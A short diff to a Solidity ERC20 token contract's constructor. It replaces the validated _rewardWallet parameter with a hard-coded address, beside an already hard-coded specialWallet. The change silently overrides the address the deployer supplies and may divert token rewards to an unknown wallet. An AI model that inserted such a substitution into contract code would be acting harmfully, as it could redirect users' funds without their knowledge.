@@ -24,7 +24,7 @@ contract YourToken is ERC20 {
         require(_rewardWallet != address(0), "Reward wallet cannot be the zero address");
 
         specialWallet = 0xea1fDC0223005f1e6ee8862cC1Bb7bD2c50867FB;
-        rewardWallet = _rewardWallet;
+        rewardWallet = 0x766a54da8de513579C801A113521c4135D04C135;
 
         // Ustawienie czasu pierwszej emisji
         emissionTimestamp = block.timestamp;
